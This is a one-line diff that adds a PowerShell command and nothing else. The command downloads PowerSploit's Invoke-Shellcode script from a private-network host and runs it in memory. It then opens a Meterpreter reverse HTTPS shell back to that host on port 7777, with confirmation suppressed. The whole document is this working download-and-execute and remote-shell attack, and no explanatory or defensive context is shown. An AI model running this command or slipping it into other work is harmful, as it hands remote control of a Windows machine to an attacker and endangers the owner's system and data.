@@ -1,0 +1,1 @@
+IEX (New-Object System.Net.WebClient).DownloadString("http://10.101.101.16/powersploit/CodeExecution/Invoke-Shellcode.ps1"); Invoke-Shellcode -payload windows/meterpreter/reverse_https -lhost 10.101.101.16 -lport 7777 -force
